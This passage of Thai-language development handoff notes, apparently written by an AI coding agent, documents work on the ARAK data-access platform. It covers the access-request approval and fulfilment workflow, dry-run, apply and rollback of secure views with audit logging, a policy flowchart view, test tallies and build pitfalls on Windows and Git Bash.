- refusal ที่ `requestable=true` → กล่อง **"The owner can let you in"** + ชื่อ approver + ปุ่ม Request access → ฟอร์ม เหตุผล (บังคับ) · จำนวนวัน (7 / 30 / 90 / until revoked หรือพิมพ์เอง 1–365) · purpose · แนบ SQL ที่ติดให้อัตโนมัติ
- มีคำขอค้างอยู่แล้ว → บอกว่า "ส่งไปแล้ว รอ owner" + ลิงก์ไป `/requests` แทนที่จะให้ส่งซ้ำ
- `requestable=false` → บอกชื่อ policy ที่ขวางและบอกตรงๆ ว่า **grant ช่วยไม่ได้** (ไม่มีปุ่มขอ)

### AX.6 หน้า `/requests` (`pages/requests/AccessRequestsPage.tsx`) + เมนู

- 2 section: **Waiting for you** (inbox — filter สถานะได้) · **Your requests**
- card ต่อคำขอ: table (ลิงก์ไป catalog) · สถานะ · purpose · เวลา · เหตุผล · ใครขอ (ฝั่ง owner) · กี่วัน · ใครตัดสิน (ฝั่งคนขอขณะ pending) · ใครตัดสิน+เมื่อไหร่+note · "What was refused" (SQL + ข้อความ refusal เดิม)
- ฝั่ง owner: ช่อง Grant days (ตรวจช่วงสดๆ: *"Between 1 and N days — no longer than was asked."*) · note · Reject (ต้องมี note) · Approve
- ฝั่งคนขอ: Withdraw เฉพาะ PENDING
- server เป็นคนบอก `mayDecide` — UI ไม่เดาเองว่าใครตัดสินได้
- เมนู `navigation.ts` + route ใน `App.tsx`

### AX.7 UI จัดให้เข้า theme (ตามแบบ OpenMetadata / EnforcementPage ที่มีอยู่)

pattern ที่ใช้ซ้ำ — **รอบถัดไปใช้ชุดเดียวกันนี้**
| ชิ้น | class |
|---|---|
| card | `rounded-xl border-secondary bg-primary shadow-xs` |
| icon tile | `size-10 rounded-lg bg-utility-brand-50` + icon `size-5 text-fg-brand-primary` |
| info note | `bg-utility-blue-50` + InfoCircle |
| error | `bg-utility-error-50 text-error-primary` + AlertTriangle, `role=alert` |
| empty state | กล่อง dashed `rounded-xl` + icon `size-7 text-fg-quaternary` |
| count pill | `bg-brand-primary text-brand-secondary` |
| footer ของ card (action) | `border-t bg-secondary px-5 py-4` |
| suggestion row | icon tile `size-6` ต่อชนิด: table = brand · column = blue (`utility-blue-600`) · keyword = gray |

### AX.8 ทดสอบ

| ชุด | ผล |
|---|---|
| backend unit | **695** เขียวทั้ง 10 module (dac-service 186 → 190) (+4 `AccessEligibilityTest` — `blockedBy` ต้องบอกชื่อ DENY ที่ match แม้อยู่ท้ายสุด · ไม่งั้นบอกชั้นที่ grant ผ่านไม่ได้ · ไม่งั้นบอกบรรทัด composition · ชื่อ policy ที่ไม่มีคำอธิบาย) |
| backend integration | **209** (dac-service 198 + `SecureViewApplierIT` 11) — `-Pintegration verify` เต็ม reactor 2026-09-25 00:5x → BUILD SUCCESS · Failures 0 Errors 0 (+23 `AccessRequestIT` บน Postgres จริง — เปิดคำขอ / เปิดซ้ำไม่ได้ / เปิดใหม่ได้หลังปิด / validation · approve เขียน grant / revoke ย้อนได้ / คนขออนุมัติเองไม่ได้ / คนนอกไม่เห็น / inbox / asset ไม่มี owner → admin / ลดวันได้ขยายไม่ได้ / ใส่กำหนดให้คำขอ until revoked ได้ / ตัดสินได้ครั้งเดียว / reject ต้องมี note / withdraw · eligibility: ไม่มี policy → requestable / อ่านได้แล้ว / **ชั้นที่ปฏิเสธ (time window) = ไม่ requestable** / ชั้นที่เปิด override ได้ / **DENY = ไม่ requestable** / **DENY ที่มาหลังขอไปแล้วยังชนะ** / **อนุมัติแล้ว mask ยังอยู่ (approval ≠ unmask)** / principal ที่ไม่รู้จัก) |
| frontend | **32 suites / 260 tests** (+20 `SqlEditor.test.tsx` · +16 `RequestAccess.test.tsx` · +13 `AccessRequestsPage.test.tsx` · +5 `accessRequests.test.ts` · `sqlCompletion.test.ts`) · `tsc --noEmit` exit 0 · `vite build` OK |
| live smoke บน jar จริง | **30/30** (`scratchpad/req_smoke.py`, ไม่ commit) — routing · `/check` ครบ 32 table · target `demo-pg.salesdb.sales.customer` ติด time window ของ `finance-subscription` → requestable · validation · สร้าง / ซ้ำ 409 · คนขออนุมัติเอง 403 · อนุมัติ 30 วัน (ขอ 7) → 400 · 0 → 400 · null → 7 วัน · ซ้ำ 409 · query รันได้ · `/check` = true · grant `source=request` · revoke → โดนปฏิเสธอีก · reject ไม่มี note 400 · withdraw ของคนอื่นไม่ได้ · **ล้างหลังจบ grant ถูก revoke หมด** |

### AX.9 ⚠️ ผู้ใช้สั่งเปลี่ยนต่อทันที (2026-09-25) — M9 slice 2

> *"อันนี้พอ Approve แล้ว ต้องให้ Data Owner, Steward หรือ Custodian มาทำให้ในระบบเนาะ ยังไม่ Auto แต่มี หน้า Impact Analysis และ ประเมิน Risk และ Suggestion ให้ Owner พิจารณาตอน Approve หรือ Reject และต้องมี Information ของคนที่ขอให้ชัดเจน Attribute, group, … หลังจาก Approve แล้ว มี Suggestion Policy ที่อาจจะ Conflict หรือ Suggestion ว่าต้องไปเพิ่มที่ Policy ไหน สร้างใหม่ หรืออย่างไร"*
> + *"Inbox ของ Access Request ควรมีปุ่มจากด้านบนไหม และควรมี notification จาก icon ด้านบนด้วยไหม"* → ตอบว่าควร

ผู้ใช้เลือก (AskUserQuestion):
1. **Approve = ตัดสินใจเท่านั้น แล้วค่อย Fulfil** — Approve บันทึกการตัดสินใจ สถานะเป็น APPROVED (รอ fulfil) · Owner / Steward / Custodian เลือกวิธี fulfil จาก suggestion: (ก) ออก grant ที่กรอกไว้ให้แล้ว (ข) เพิ่มคน/กลุ่มเข้า policy ที่มีอยู่ (ค) สร้าง policy ใหม่เป็น **Draft** เข้า lifecycle ปกติ · โชว์ conflict ก่อนลงมือ · ปิดคำขอ (FULFILLED) เมื่อทำเสร็จจริงเท่านั้น
2. **Steward / Custodian = Custom Property ใน OM** — custom property ชนิด user/team บน table (default ชื่อ `dataSteward` / `dataCustodian`) · sync read-only · ตกทอดจาก schema/database แบบ facet อื่น · ชื่อ property ตั้งได้ใน Settings

แผนที่จะทำ (**migration V23** — V22 ถูกใช้โดย notices แล้ว · ผู้ใช้ตัดสินแล้วว่า **Manual Configure = default, Automatic = Roadmap** ดูข้อ BA.5 · ต้องรวมกับ Workflow Design ข้อ BA.6): V23 (สถานะ FULFILLED, `approved_days`, `fulfilled_by/at`, `fulfilment_kind` GRANT / POLICY_UPDATED / POLICY_CREATED, `fulfilment_ref`, คลาย `access_request_approved_has_grant`) · `GET /{id}/review` (ข้อมูลผู้ขอ: attribute / group / team / role / grant ที่มี / คำขอที่ผ่านมา · ข้อมูล asset: tag / tier / domain / owner / steward / custodian · impact: ถ้าได้สิทธิ์จะเห็นอะไร column ไหนถูก mask แถวไหนถูกกรอง · risk แบบ rule-based อธิบายได้ · suggestion · conflict) · `POST /{id}/fulfil` · หน้า review · ไอคอน Inbox + badge บน header
**suggestion ห้าม activate policy เอง** (กติกาเดียวกับ FR-2.6 / LLM) — สร้างได้แค่ Draft

### AX.10 กับดักที่เจอรอบนี้

- **`vite build` จาก Git Bash ต้องกัน path mangling** — `VITE_BASE=/Arak/` ถูก MSYS แปลงเป็น `/Program Files/Git/Arak/` เงียบๆ → jar เสิร์ฟหน้าขาว · ใช้ `MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL='*' VITE_BASE=/Arak/ npm run build` · และ `npm run build` เปล่าๆ จะเขียนทับ dist ด้วย base `/` (backend log เตือน blank page)
- local API ไม่มี prefix `/Arak` — `http://localhost:8080/api/v1` (prefix มีเฉพาะหลัง nginx บน prod) · UI local อยู่ที่ `http://localhost:8080/Arak/`
- catalog list คืน key `items` ไม่ใช่ `data` · `POST /query` ต้องการ `sourceId` (map จากชื่อ `dataSource` ผ่าน `GET /sources`)
- approve `days: null` ได้ 200 **ไม่ใช่ bug** — null = เท่าที่ขอ
- Prettier ไม่ใช่ gate (ไม่มี config และไฟล์เดิมก็ไม่ผ่าน)
- **FK ใหม่ทำ fixture ของ IT เก่าพัง** — V21 เพิ่ม `access_request.grant_id → access_grant` ทำให้ `TRUNCATE ... access_grant ...` ที่ไม่มี `CASCADE` ล้มทั้ง class (`PolicyOverviewIT` 24 · `PolicyBindingMaterializerIT` 10 — รอบแรกของ verify ได้ **34 errors**) · แก้โดยใส่ `access_request` เข้า TRUNCATE ของสองไฟล์นั้น · **ทุกครั้งที่เพิ่ม FK ชี้เข้าตารางเดิม ให้ `grep -rn TRUNCATE --include=*IT.java` หา fixture ที่ต้องตามแก้**

---

## รอบก่อนหน้า — **M5 slice 3 (ครึ่งหลัง): dry-run / apply / rollback ของ secure view ใช้ได้จากหน้าจอแล้ว** + เมนู Enforcement กลับมา

> โจทย์: *"งั้นทำต่อครับ"* — งานที่ค้างจากข้อ AU.7: `enforcement_state` store + REST dry-run / apply / rollback + หน้าจอ + เอาแท็บ Enforcement กลับมา
> ผลคือ chain 5.1.2 ต่อครบเป็นครั้งแรก: **กด Dry run บนหน้าจอ → อ่าน DDL → กด Apply → view ขึ้นที่ source จริง → คนสองคน select แล้วได้คำตอบคนละชุด → กด Roll back → view หายไป**

### AW.1 chain เต็มตอนนี้

```
EnforcementPage (UI)
  → EnforcementResource        /api/v1/enforcement/secure-views/*
    → SecureViewService         ประกอบ input ทั้งหมดจากที่เดียวกัน
      ├─ PolicyEngine           ตัดสินใจให้ "ทุกคน" (population) ไม่ใช่คนเดียว
      ├─ AppDbEntitlementSource แถว row_entitlement ของ app DB (commit ebc399f)
      ├─ SourceProbe            column list สด จาก source (ไม่ใช่จาก catalogue)
      ├─ ViewCompiler           view หน้าตายังไง            (slice 1)
      ├─ RowEntitlementMaintainer ใครได้แถวไหน              (slice 2)
      ├─ SecureViewApplier      ตัวเดียวที่เขียนลง DB ลูกค้า (slice 3 ครึ่งแรก)
      ├─ ReviewedPlans          dry run ที่มีคนอ่านแล้ว — ถือไว้ในหน่วยความจำ
      └─ EnforcementStateStore  enforcement_state + audit_enforcement (V20)
```

### AW.2 `V20__enforcement_audit.sql`

| อะไร | ทำไม |
|---|---|
| `enforcement_state` + `secure_object_schema` / `secure_object_name` | **rollback ต้อง drop object ที่สร้างไปจริง ไม่ใช่ชื่อที่ naming setting ของ source จะสร้างวันนี้** — ถ้ามีคนเปลี่ยน secure schema จาก `sec` เป็น `secure` หลัง apply แล้วกด rollback จะ drop view ที่ไม่เคยมี แล้ว **รายงานว่าสำเร็จ ทั้งที่ view จริงยังตั้งอยู่** |
| ตารางใหม่ `audit_enforcement` (append-only เหมือน V5) | ทุก dry run / apply / rollback **ไม่ว่าผลจะออกมายังไง** · outcome ∈ `REVIEWED` `APPLIED` `ROLLED_BACK` `STALE` `FAILED` `REFUSED` · เก็บ `review_id` + `signature` เพื่อตอบได้ว่า *"คนที่กด apply อ่านอะไรไป"* · `client_ip` มาจาก `getRemoteAddr()` |
| **dry run ก็ถูก audit** | มันไม่เขียนอะไร แต่มันเปิด connection เข้า DB ลูกค้าด้วย credential ของแพลตฟอร์มและอ่านว่าใครถืออะไรอยู่ — auditor ถามเรื่องนี้แน่ |

### AW.3 `EnforcementStateStore`

- `find` / `list` / `history(fqn, limit)` / `recordApplied` / `recordFailure` / `recordRolledBack` / `audit`
- ⚠️ **`recordFailure` ไม่ทับ `APPLIED` เป็น `FAILED`** — apply ครั้งที่สองที่พังถูก rollback ทั้ง transaction แปลว่า source ยังถือ view ตัวเดิมอยู่เป๊ะ · ถ้าเขียนว่า `FAILED` คนจะไปซ่อม object ที่ไม่ได้เสีย → สถานะคงเป็น `APPLIED` แล้ววาง `last_error` ไว้ข้างๆ · `FAILED` เกิดได้เฉพาะตอนที่ก่อนหน้านี้ยังไม่มีอะไรติดตั้ง
- `recordRolledBack` → `NOT_ENFORCED` + ล้างชื่อ object · **เก็บ script เดิมไว้** (สิ่งที่ apply ล่าสุดยังอ่านได้หลังถอดออกไปแล้ว)

### AW.4 `ReviewedPlans` — dry run ที่มีคนอ่านแล้ว

**apply ส่งมาแค่ `reviewId` ไม่มีอย่างอื่นเลย** — server เก็บสิ่งที่ตัวเองแสดงไว้เอง หน้าจอส่งแผนที่แก้เองกลับมาไม่ได้ และ**ไม่ควรจะทำได้**

| กติกา | ค่า |
|---|---|
| ใช้ได้ครั้งเดียว | `take()` คือเอาออกเลย — apply ครั้งที่สองด้วย id เดิม → 409 audit เป็น `STALE` |
| อายุ | 30 นาที |
| ความจุ | 256 — เกินแล้วลืมตัวที่เก่าสุดก่อน |
| ผูกกับ asset | id ของ asset อื่น → ไม่เจอ **และไม่ถูกเผาทิ้ง** (เจ้าของจริงยังใช้ได้) |

⚠️ **อยู่ในหน่วยความจำ = สมมติว่ามี PM2 process เดียว** (ซึ่งตรงกับ deploy ปัจจุบัน) · restart แล้ว review ทุกใบหาย → คนแค่กด Dry run ใหม่ ไม่มีอะไรพัง · **ถ้าวันหนึ่งรัน cluster mode หลาย instance ต้องย้ายลงตาราง** ไม่งั้น apply จะสุ่ม 404/409

### AW.5 `SecureViewService` — กติกาที่สำคัญ (อยู่ใน javadoc ของคลาสด้วย)

| กติกา | ทำไม |
|---|---|
| **column มาจาก source สด ไม่ใช่ catalogue** | column ที่ crawl ยังไม่เห็น = column ที่ไม่มี policy คุ้ม · ใช้ list สดสร้าง view แล้ว **column ที่ catalogue ไม่รู้จักขึ้นเป็น warning ที่คน review ต้องอ่าน** |
| **ตัดสินใจให้ทั้ง population** | maintainer revoke ทุกคนที่ไม่อยู่ใน input · population ที่โหลดไม่ครบ = revoke คนที่เกิน cut-off โดยไม่มีใครสั่ง → **เกิน `POPULATION_LIMIT` = 2000 ปฏิเสธ ไม่ตัด** · population ว่าง ก็ปฏิเสธ (ไม่งั้นคือ revoke ทุกคน) |
| **apply compile แผนใหม่แล้วเทียบ** | applier เทียบ `signature` ของแถว · คลาสนี้เทียบ **DDL** · สองอย่างขยับแยกกันได้ (เพิ่ม column ที่ source → DDL เปลี่ยน แถวไม่เปลี่ยน) → ไม่ตรง = 409 ไม่ apply อะไรเลย |
| **rollback ใช้ชื่อที่เก็บไว้ตอน apply** | ดู AW.2 |
| **credential ผ่าน `CredentialResolver` ตัวที่ `DacApplication` ถือ** | ตัวใหม่ไม่มี Fernet opener → อ่าน credential ที่ seal ไว้ไม่ออก · wire แล้วใน `DacApplication.java` |
| **ไม่ทำ cutover (FR-6.1.1)** | ไม่ GRANT SELECT บน view และไม่ REVOKE base table · view ที่ apply แล้ว**อ่านได้แค่เจ้าของ** จนกว่าจะมีคน grant = fail-closed · **dry run พูดเรื่องนี้ออกมาตรงๆ** ใน banner ของหน้าจอด้วย |
| `readerRole` = `null` | ยังไม่มี `DbPrincipalProvisioner` · view ใช้ `DB_PRINCIPAL` (current_user) |
| rollback | `DROP VIEW IF EXISTS` อย่างเดียว · **ไม่แตะ schema `acl`** (secure view ทุกตัวใน DB อ่านตาราง 3 ใบเดียวกัน และแถวพวกนั้นลำพังไม่ grant อะไร) |

### AW.6 `EnforcementResource` — `/api/v1/enforcement/secure-views`

| endpoint | ใคร | หมายเหตุ |
|---|---|---|
| `GET ?q=` | ADMIN · POLICY_AUTHOR · DATA_OWNER | candidate = table ที่ catalogue วางได้ บน source ที่เปิดอยู่ + สถานะ |
| `GET /state?fqn=&limit=` | เหมือนบน | state + ประวัติ audit |
| `POST /dry-run {assetFqn}` | เหมือนบน | คืน `reviewId` + `expiresAt` + DDL + rollback script + diff แถว + warning |
| `POST /apply {assetFqn, reviewId}` | **PLATFORM_ADMIN เท่านั้น** (method-level `@Secured`) | reviewId ไม่ใช่ UUID → 400 |
| `POST /rollback {assetFqn}` | **PLATFORM_ADMIN เท่านั้น** | ไม่มีอะไรติดตั้ง → 409 audit `REFUSED` |

error mapping: `NotFound` → **404** · `Conflict` (review หาย/stale) → **409** · `Refused` (ทำไม่ได้ตามที่ขอ ไม่ได้แตะอะไร) → **422** · `SourceFailure` (source ปฏิเสธ transaction ถูก rollback) → **502** · body เป็น `{"message": …}` ทุกตัว

### AW.7 หน้าจอ `/enforcement` + เมนูกลับมาแล้ว

- `frontend/app/src/pages/enforcement/EnforcementPage.tsx` (ใหม่) + `api/secureViews.ts` (ใหม่) · route ใน `App.tsx` · `navigation.ts`: เอา `hidden: true` ออก · `milestone: null` · description ใหม่ *"Review, apply and roll back secure views on registered sources."* · `visibleTo` เดิม (`POLICY_AUTHOR`, `DATA_OWNER` + admin)
- **Access ยังซ่อนอยู่** (รอหน้า overview ของ M8 — ดูข้อ AQ.9)
- การ์ดต่อ table: สถานะ · source · FQN · base table / secure view (หรือ *Would create*) / last change · last error · ปุ่ม **History** · **Dry run** · **Roll back** (admin + APPLIED/DRIFTED เท่านั้น — ต้องกดยืนยัน *"Drop the view"* อีกครั้ง)
- Review: *"Dry run — nothing has been written"* + เวลาหมดอายุ · 4 ตัวเลข (People decided / Allowed to read / Rows to write / Rows to remove) · warning สีเหลือง · live column (ตัวที่ไม่อยู่ใน catalogue เป็นสี warning) · script *Will run* / *Rollback, if needed* · **คนที่ไม่ใช่ admin เห็น review ได้แต่ไม่มีปุ่ม Apply** (*"Only a platform administrator can apply a review."*)
- apply ที่ถูกปฏิเสธ → **ล้าง review ทิ้งทันที** (มันถูกใช้ไปแล้ว กดซ้ำก็ 409) แล้วแสดงเหตุผลจาก server
- หน้าตาเป็นชุดเดียวกับหน้าอื่น (Button / Chip / TextField ตัวเดิม · ไม่มี style ใหม่) — ตรวจด้วย screenshot ผ่าน `:8090/Arak/` แล้ว · ช่องค้นหาเคยแคบเกิน → `tw:w-full`

### AW.8 เทสต์ที่เพิ่ม

| ไฟล์ | จำนวน | คุมอะไร |
|---|---|---|
| `ReviewedPlansTest` | 6 | ใช้ครั้งเดียว · asset อื่นไม่เผา review · หมดอายุตรงนาทีที่ 30 · นาทีที่ 29 ยังใช้ได้ · id ไม่รู้จัก/null · เกินความจุลืมตัวเก่าสุด |
| `SecureViewServiceIT` (Testcontainers) | 15 | candidate · dry run ไม่เขียนอะไร + บอก column ที่ไม่อยู่ใน catalogue · apply แล้วคนอ่านเห็นตาม policy · review ใช้ครั้งเดียว (ครั้งที่สอง = STALE) · id ปลอม · **column ที่เพิ่มหลัง review ทำให้ stale** · **policy ที่เปลี่ยนหลัง review ทำให้ stale** · **login อ่านอย่างเดียว → FAILED** · rollback drop view เท่านั้น · **rollback ใช้ชื่อที่เก็บไว้ ไม่ใช่ pattern วันนี้** · table ไม่รู้จัก = 404 + audit · source ปิดอยู่ · **population ว่างถูกปฏิเสธ** · table ที่ถูก drop หลัง crawl · credential resolve ไม่ได้ |
| `EnforcementPage.test.tsx` | 7 | แสดงสถานะ · dry run → apply ส่งแค่ fqn + reviewId · non-admin ไม่มี Apply / Roll back · apply ถูกปฏิเสธล้าง review · rollback ต้องยืนยัน Cancel ไม่ส่งอะไร · ไม่มีอะไรติดตั้งไม่มี Roll back · search ส่งไป server |

### AW.9 ทดสอบสดผ่าน `:8090/Arak/` (รูปแบบ prod — jar เสิร์ฟ `dist`)

ตัว candidate เดียวคือ `demo-pg.salesdb.sales.customer` → `sec.customer` (Postgres dev ใน `dac-srcpg`)

| ขั้น | ผล |
|---|---|
| list | 200 · populationLimit 2000 |
| dry run | 200 · 5 principal · 3 allowed · 9 live column · uncatalogued 0 · DDL ถูก |
| analyst_a เรียก list / apply | **403** ทั้งคู่ |
| reviewId มั่ว | 400 |
| apply ด้วย `arak_reader` (read-only) | **502** *"permission denied for database salesdb"* → state `FAILED` + audit `FAILED` · ไม่มีอะไรค้างที่ source |
| ใช้ review เดิมซ้ำ | **409** audit `STALE` |
| (ให้ `CREATE ON DATABASE` ชั่วคราวใน container dev) dry run ใหม่ + apply | 200 · 6 statement · 7 แถว insert · `APPLIED` |
| `SET ROLE analyst_a` → `SELECT * FROM sec.customer` | เห็น 2 จาก 4 แถว (BKK-01 เท่านั้น) · email `***@example.co.th` · citizen `********23456` |
| `SET ROLE analyst_b` | 0 แถว |
| rollback | 200 · 1 statement · `NOT_ENFORCED` · view หายจริง |
| rollback ซ้ำ | **409** audit `REFUSED` |
| เก็บกวาด | drop role analyst_a/b · `DROP SCHEMA acl CASCADE` · `DROP SCHEMA sec CASCADE` · `REVOKE CREATE` → schema เหลือ `public` + `sales` เหมือนเดิม · `has_database_privilege` = false |

> ถ้า dry run ครั้งหลังเห็นว่า "allowed" เหลือ 1 — ไม่ใช่บั๊ก · `finance-subscription` มี time window และหลัง ~23:00 analyst_a ถูก deny (*"outside the policy's permitted time window"*)

### AW.10 ⚠️ ของที่ต้องรู้ก่อนใช้กับ source จริง

1. **credential ของ source ต้อง CREATE ได้** (schema `sec` + `acl` + view) · demo `arak_reader` เป็น read-only → apply ได้ `FAILED` ตามที่ควร · **follow-up: แยก credential สำหรับ DDL ออกจาก credential สำหรับ read** (ไม่อยากให้ credential ของ Query API ถือสิทธิ์ CREATE)
2. **cutover ยังไม่มี** — หลัง apply ต้อง GRANT SELECT บน view + REVOKE base table เอง (FR-6.1.1 = งานถัดไป)
3. review อยู่ในหน่วยความจำ (AW.4) — PM2 ต้อง `instances: 1`

### AW.11 กับดักที่เจอรอบนี้

| อาการ | สาเหตุ | แก้ |
|---|---|---|
| หน้าเว็บขาวหลัง restart · log บอก base path ผิด | **Git Bash แปลง `APP_WEB_BASE_PATH=/Arak/` เป็น `C:/Program Files/Git/Arak/`** (MSYS path conversion) | `export MSYS_NO_PATHCONV=1` ก่อน `set -a; . ./.env` ในสคริปต์ bring-up |
| `TaskStop` แล้ว port 8080 ยังไม่ว่าง | `exec java` กลายเป็น orphan | `Get-NetTCPConnection -LocalPort 8080` → `Stop-Process -Id <pid>` |
| heredoc ไม่เข้า `docker exec` | ไม่มี `-i` | `docker exec -i …` |
| `DROP ROLE` พัง | role ยังมีสิทธิ์บน schema `sec` | drop schema ก่อน แล้วค่อย drop role |
| JSON ของ `Rows` มี key `"empty"` เพิ่ม / `DryRun` มี `"satisfied"` | Jackson อ่าน `isEmpty()` / `isSatisfied()` เป็น property | ไม่มีผล — frontend `rowCount` อ่านแค่ 3 array · อย่าเอา `len()` ไปวนทุก key ใน script |
| `/decisions/simulate` 404 | ไม่มี endpoint นี้ | `POST /api/v1/decisions {principal, assetFqn, environment:"prod"}` |

### AW.12 ต่อจากนี้

- **slice 4: MSSQL Testcontainers** (dialect มีแล้ว ยังไม่เคยรันบน SQL Server จริง)
- credential แยกสำหรับ DDL (AW.10 ข้อ 1)
- **cutover helper (FR-6.1.1)** — REVOKE base table + GRANT view + optional rename swap
- `DbPrincipalProvisioner` → แล้ว `readerRole` จะไม่เป็น null
- ย้าย `ReviewedPlans` ลงตาราง ถ้าจะรันหลาย instance
- DriftDetector (M8) จะเป็นคนเขียน `DRIFTED` — ตอนนี้ยังไม่มีใครเขียนสถานะนี้

## รอบก่อนหน้า — **Policy Flowchart** — โหมดที่สอง ของทั้งคนเขียนและคนอ่าน policy

> โจทย์จากผู้ใช้: *"อันนี้คืออยากให้เปน feature เพิ่มนะ ไม่ใช่มาแทนที่หน้าเดิม แล้วแต่ว่าอยากให้มีทางเลือกให้ — คนสร้าง policy ว่าจะดูแบบ diagram flow หรือหน้า ui เดิม · คนอ่าน policy ก็ต้องมีโหมด text กับ diagram flowchart"* และ *"เปนภาพนะ / flow ที่พูดถึง"*

### AV.1 กฎข้อเดียวที่คุมทุกการตัดสินใจในรอบนี้: **ของเดิมต้องไม่ขยับ**

ทั้ง 2 หน้า **default เป็นของเดิมเป๊ะ** — คนที่ไม่กดสวิตช์จะไม่รู้เลยว่ามีอะไรเพิ่ม (นอกจากตัวสวิตช์เอง)
ค่าที่จำไว้ใน `localStorage` เป็น **override เท่านั้น** ไม่มีค่า = หน้าเดิม · อ่าน/เขียนหุ้ม `try/catch` ทั้งคู่ (private window ที่บล็อก site data จะ throw ทันที และ "หน้าที่เรนเดอร์ไม่ได้เพราะจำ preference ไม่ได้" ไม่คุ้ม)

| หน้า | สวิตช์ | default | คีย์ |
|---|---|---|---|
| `PolicyBuilderPage` (คนเขียน) | **Form / Flowchart** อยู่ใน header | `Form` | `arak.policy.view` |
| `PolicyDetailPage` (คนอ่าน) | **Text / Flowchart** อยู่บนหัวการ์ด *In plain words* | `Text` | `arak.policy.reading` |

### AV.2 ทำไมเป็น **model + renderer** ไม่ใช่ component เดียว

`policyFlow.ts` = pure function `buildFlow(policy) → FlowModel` · `PolicyFlowChart.tsx` = วาดอย่างเดียว
ข้อความในกล่องทุกบรรทัด**เรียกจาก `describe*` ตัวเดียวกับที่ประโยค "In plain words" ใช้** — diagram ที่มีความเข้าใจคำว่า `contains` เป็นของตัวเองจะแย่กว่าไม่มี diagram เลย เพราะมันคือ**คำอธิบายชุดที่สอง ที่สวยกว่า และผิด** ของเอกสารที่กำลังจะถูก publish

### AV.3 ทำไมเรียง **asset → คน → ผล** ไม่ใช่ตามหน้าฟอร์ม

เป็นลำดับที่ engine ใช้จริง: binding resolve กับ asset ก่อน → **policy ที่ selector ว่าง ตายตั้งแต่ด่านแรก ไม่ว่า subject จะเขียนดีแค่ไหน**
นี่คือความผิดพลาดที่ flowchart ควรโชว์ที่**กล่องแรก** ไม่ใช่กล่องสุดท้าย

**ทุกด่านต้องบอกทางออกของ "ไม่ผ่าน"** — เขียนไว้ว่า *"This policy is not bound to it"* / *"Another policy may still decide"* ไม่ใช่ปล่อยว่าง เพราะด่านที่ไม่บอกทางแยก คนอ่านจะเติมเองว่า "ไม่ผ่าน = ถูก deny" ซึ่ง**ไม่ใช่เรื่องเดียวกัน**

### AV.4 tone 4 แบบ — `open` แยกจาก `set` โดยตั้งใจ

| tone | เมื่อไหร่ | สี |
|---|---|---|
| `set` | เขียนครบ | เทา/ปกติ |
| `empty` | ยังไม่ได้เขียน → **selector ว่าง = ผูกกับ 0 asset** (ไม่ใช่ "ทุก asset") | เส้นประ |
| `open` | เขียนครบแล้ว **และผ่านทุกคน** (ไม่มี subject) | warning |
| `deny` | subscription DENY | error |

> กล่องที่ทุกคนผ่านได้คือกล่องที่ **authored ครบและ permissive เต็มที่** — ถ้าทาสีเหมือนกล่องที่แคบ นั่นคือวิธีที่ policy ถูก publish กว้างกว่าที่ตั้งใจ

### AV.5 ⚠️ trap ที่เสียเวลาไปหนึ่งรอบ: ชื่อไฟล์ชนกันบน Windows

`PolicyFlow.tsx` (component) กับ `policyFlow.ts` (model) — **filesystem ของ Windows ไม่แยกตัวพิมพ์** → `tsc` เด้ง `TS1261: file name differs only in casing` แล้ว import ไป resolve เข้าไฟล์ผิด (`has no default export`)
→ เปลี่ยนชื่อ component เป็น **`PolicyFlowChart.tsx`** (model ยังชื่อ `policyFlow.ts` คู่กับ `policyLanguage.ts` เหมือนเดิม)

### AV.6 ไม่ใช้ graph library

`reactflow` / `@antv/g6` = bundle ใหญ่กว่าทั้งหน้ารวมกัน · ดึงกล่องออกจาก DOM (เสีย text selection, keyboard focus, ลำดับที่ screen reader อ่าน) · และ**วาดด้วยสีของตัวเอง** ซึ่งขัดกับคำสั่ง *"เอาให้ทุกอย่างเหมือนเดิมนะ ความสวยงาม"* ตรงๆ
→ กล่อง = `div` + token เดิม · **เส้นเชื่อมกับหัวลูกศรเป็น SVG จริง** (ไม่ใช่ตัวอักษร `↓`) เพราะสิ่งที่ chart เพิ่มจาก list คือ "ลำดับ" และ "ด่านมีทางออกสองทาง" — ทั้งสองอย่างต้องเห็นเป็นเส้น

### AV.7 คลิกกล่องแล้วกลับไปแก้ได้ (เฉพาะโหมดคนเขียน)

`PolicyFlowChart` รับ `onEdit?` — **มีเมื่อแก้ได้เท่านั้น** ไม่ส่ง = กล่องเป็น text ธรรมดา ไม่มีปุ่ม (คนอ่านที่ไม่มีสิทธิ์แก้ต้องไม่เห็นปุ่มชวนแก้)
`Step` ใน `controls.tsx` ได้ `id={\`policy-step-${step}\`}` → คลิกกล่อง = สลับกลับเป็น Form **แล้วค่อย** `scrollIntoView` (ต้อง defer ด้วย `setTimeout(…, 0)` ไม่งั้น scroll ไปหา element ที่ยังไม่ถูกเรนเดอร์ แล้วคนใช้ค้างอยู่หัวหน้า)

### AV.8 ของที่เพิ่ม/แก้

| ไฟล์ | อะไร |
|---|---|
| `pages/policies/policyFlow.ts` | **ใหม่** — model ล้วน `buildFlow()` → `FlowModel { entry, steps[], exit, gate }` |
| `pages/policies/PolicyFlowChart.tsx` | **ใหม่** — renderer, SVG connector + branch arrow, responsive |
| `pages/policies/policyFlow.test.ts` | **ใหม่ 9 tests** |
| `pages/policies/PolicyFlowChart.test.tsx` | **ใหม่ 3 tests** |
| `pages/policies/controls.tsx` | + `ViewToggle` · `useViewMode` · `Step` มี `id` |
| `pages/policies/PolicyBuilderPage.tsx` | สวิตช์ใน header · คอลัมน์ฟอร์มสลับเป็น chart · `editStep()` |
| `pages/policies/PolicyDetailPage.tsx` | `Panel` รับ `action` · สวิตช์ Text/Flowchart |
| `pages/policies/policyLanguage.ts` | `describePrincipal` เป็น `export` (model เรียกใช้ซ้ำ) |

### AV.9 ยังไม่ได้ทำ — view B "Layer Stack"

diagram ที่โชว์ว่า policy ตัวนี้จะถูก **global ทับ** หรือไม่ (ตรงกับบรรทัดในแผน: *"UI ต้องเตือนตอนสร้าง local policy ว่ามันจะถูก global ทับ"*) ยังทำไม่ได้ตอน**สร้าง** เพราะ `PolicyOverview.overlaps()` ต้องมี policy id ที่เซฟแล้ว
→ ต้องเพิ่ม **`POST /v1/policies/preview/conflicts`** ที่รับ draft ที่ยังไม่เซฟ แล้วคืน `Overlap[]` (ใช้ logic เดิม ไม่ต้องโหลดจาก DB)

## รอบก่อนหน้า — **M5 slice 3 (ครึ่งแรก): `SecureViewApplier`** — ครั้งแรกที่ secure view ของ ARAK ทำงานบนฐานข้อมูลจริง

